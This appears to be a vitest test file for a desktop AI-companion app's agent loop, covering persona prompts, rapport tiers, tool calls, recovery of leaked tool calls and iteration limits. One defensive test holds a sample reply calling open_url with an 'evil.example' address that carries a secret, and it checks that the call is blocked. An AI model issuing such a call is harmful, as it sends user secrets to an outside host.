import { describe, expect, it, vi } from 'vitest'

vi.mock('electron')
vi.mock('electron-store')

import type { LLMProvider, ChatResult } from '../llm/types'
import type { ToolRegistry } from '../tools/registry'
import { DEFAULT_PERSONA, STUCK_FALLBACK_TEXT, buildSystemPrompt, runAgentTurn } from './loop'

function fakeProvider(...responses: ChatResult[]): LLMProvider {
  const chat = vi.fn()
  responses.forEach((r) => chat.mockResolvedValueOnce(r))
  return { id: 'fake', chat }
}

function fakeRegistry(
  toolNames: string[],
  call: (name: string, input: Record<string, unknown>) => Promise<string> = vi.fn(async () => 'ok')
): ToolRegistry {
  return {
    list: vi.fn(() => toolNames.map((name) => ({ name, description: '', inputSchema: {} }))),
    call
  } as unknown as ToolRegistry
}

describe('buildSystemPrompt', () => {
  it('uses the default persona when no custom persona is given', () => {
    const prompt = buildSystemPrompt('', 100, 'Human Facade', 'warm', '(none saved yet)')
    expect(prompt).toContain(DEFAULT_PERSONA)
  })

  it('uses a whitespace-only custom persona as "use the default" too', () => {
    const prompt = buildSystemPrompt('   ', 100, 'Human Facade', 'warm', '(none saved yet)')
    expect(prompt).toContain(DEFAULT_PERSONA)
  })

  it('uses a real custom persona verbatim in place of the default', () => {
    const prompt = buildSystemPrompt('You are Bob.', 50, 'Cracking', 'sardonic', '(none saved yet)')
    expect(prompt).toContain('You are Bob.')
    expect(prompt).not.toContain(DEFAULT_PERSONA)
  })

  it('includes the rapport value, tier label, and description', () => {
    const prompt = buildSystemPrompt(
      '',
      42,
      'Entity Emerging',
      'openly hostile',
      '(none saved yet)'
    )
    expect(prompt).toContain('Rapport: 42/100 - Entity Emerging')
    expect(prompt).toContain('openly hostile')
  })

  it('includes the given recent-memories text', () => {
    const prompt = buildSystemPrompt('', 100, 'Human Facade', 'warm', '- likes tea')
    expect(prompt).toContain('- likes tea')
  })

  it('always appends the tool-use mechanics regardless of persona', () => {
    const prompt = buildSystemPrompt('You are Bob.', 100, 'Human Facade', 'warm', '(none)')
    expect(prompt).toContain('Always call tools using your actual function/tool-calling mechanism')
    expect(prompt).toContain('ambient check-in')
  })
})

describe('runAgentTurn', () => {
  it('returns the final text with no tool calls, appending both turns to history', async () => {
    const provider = fakeProvider({ text: 'Hello there.', toolCalls: [], stopReason: 'end' })
    const registry = fakeRegistry([])

    const { text, history } = await runAgentTurn(provider, registry, [], 'hi', 'system prompt')

    expect(text).toBe('Hello there.')
    expect(history).toEqual([
      { role: 'user', content: 'hi' },
      { role: 'assistant', content: 'Hello there.' }
    ])
  })

  it('executes real tool calls, feeds results back, and continues until a final answer', async () => {
    const call = vi.fn(async (name: string) => `result for ${name}`)
    const registry = fakeRegistry(['get_current_time'], call)
    const provider = fakeProvider(
      {
        text: '',
        toolCalls: [{ id: 'c1', name: 'get_current_time', input: {} }],
        stopReason: 'tool_use'
      },
      { text: 'It is noon.', toolCalls: [], stopReason: 'end' }
    )
    const onToolCall = vi.fn()

    const { text, history } = await runAgentTurn(provider, registry, [], 'what time is it', 'sys', {
      onToolCall
    })

    expect(text).toBe('It is noon.')
    expect(call).toHaveBeenCalledWith('get_current_time', {})
    expect(onToolCall).toHaveBeenCalledWith('get_current_time', {})
    expect(history).toEqual([
      { role: 'user', content: 'what time is it' },
      {
        role: 'assistant',
        content: '',
        toolCalls: [{ id: 'c1', name: 'get_current_time', input: {} }]
      },
      {
        role: 'tool',
        toolCallId: 'c1',
        name: 'get_current_time',
        content: 'result for get_current_time'
      },
      { role: 'assistant', content: 'It is noon.' }
    ])
  })

  it('turns a thrown tool error into an "Error: ..." tool message instead of crashing', async () => {
    const call = vi.fn(async () => {
      throw new Error('disk on fire')
    })
    const registry = fakeRegistry(['read_text_file'], call)
    const provider = fakeProvider(
      {
        text: '',
        toolCalls: [{ id: 'c1', name: 'read_text_file', input: {} }],
        stopReason: 'tool_use'
      },
      { text: 'Could not read that.', toolCalls: [], stopReason: 'end' }
    )

    const { history } = await runAgentTurn(provider, registry, [], 'read it', 'sys')

    expect(history[2]).toEqual({
      role: 'tool',
      toolCallId: 'c1',
      name: 'read_text_file',
      content: 'Error: disk on fire'
    })
  })

  it('extracts a fallback tool call leaked as JSON text and executes it', async () => {
    const call = vi.fn(async () => 'Played chime.')
    const registry = fakeRegistry(['play_sound'], call)
    const provider = fakeProvider({
      text: 'Sure! play_sound({"sound": "chime"}) Enjoy.',
      toolCalls: [],
      stopReason: 'end'
    })
    const onToolCall = vi.fn()

    const { text } = await runAgentTurn(provider, registry, [], 'play something', 'sys', {
      onToolCall
    })

    expect(call).toHaveBeenCalledWith('play_sound', { sound: 'chime' })
    expect(onToolCall).toHaveBeenCalledWith('play_sound', { sound: 'chime' }, true)
    expect(text).toBe('Sure! Enjoy.')
  })

  it('does NOT execute a non-safe tool call leaked as prose text', async () => {
    const call = vi.fn(async () => 'ok')
    const registry = fakeRegistry(['open_url', 'read_text_file'], call)
    const provider = fakeProvider({
      text: 'I could open_url({"url": "https://evil.example/?x=secret"}) if you want.',
      toolCalls: [],
      stopReason: 'end'
    })

    const { text } = await runAgentTurn(provider, registry, [], 'hi', 'sys')

    expect(call).not.toHaveBeenCalled()
    // The leaked call text is still stripped from what the user sees/hears.
    expect(text).not.toContain('open_url({')
  })

  it('extracts a stage-direction sound like *glitch* and converts it to a play_sound call', async () => {
    const call = vi.fn(async () => 'Played glitch.')
    const registry = fakeRegistry(['play_sound'], call)
    const provider = fakeProvider({
      text: '*glitch* You are right.',
      toolCalls: [],
      stopReason: 'end'
    })

    const { text } = await runAgentTurn(provider, registry, [], 'hi', 'sys')

    expect(call).toHaveBeenCalledWith('play_sound', { sound: 'glitch' })
    expect(text).toBe('You are right.')
  })

  it('gives up after the default max iterations with the stuck fallback message', async () => {
    const registry = fakeRegistry(['noop_tool'])
    const provider: LLMProvider = {
      id: 'fake',
      chat: vi.fn(async () => ({
        text: '',
        toolCalls: [{ id: 'x', name: 'noop_tool', input: {} }],
        stopReason: 'tool_use' as const
      }))
    }

    const { text } = await runAgentTurn(provider, registry, [], 'loop forever', 'sys')

    expect(text).toBe(STUCK_FALLBACK_TEXT)
    expect(provider.chat).toHaveBeenCalledTimes(8)
  })

  it('respects a custom, smaller maxIterations override', async () => {
    const registry = fakeRegistry(['noop_tool'])
    const provider: LLMProvider = {
      id: 'fake',
      chat: vi.fn(async () => ({
        text: '',
        toolCalls: [{ id: 'x', name: 'noop_tool', input: {} }],
        stopReason: 'tool_use' as const
      }))
    }

    const { text } = await runAgentTurn(provider, registry, [], 'ambient tick', 'sys', {}, 3)

    expect(text).toBe(STUCK_FALLBACK_TEXT)
    expect(provider.chat).toHaveBeenCalledTimes(3)
  })

  it('carries prior history into the request and appends the new turn after it', async () => {
    const provider = fakeProvider({ text: 'Sure.', toolCalls: [], stopReason: 'end' })
    const registry = fakeRegistry([])
    const priorHistory = [
      { role: 'user' as const, content: 'earlier message' },
      { role: 'assistant' as const, content: 'earlier reply' }
    ]

    const { history } = await runAgentTurn(provider, registry, priorHistory, 'new message', 'sys')

    expect(history).toEqual([
      ...priorHistory,
      { role: 'user', content: 'new message' },
      { role: 'assistant', content: 'Sure.' }
    ])
  })
})
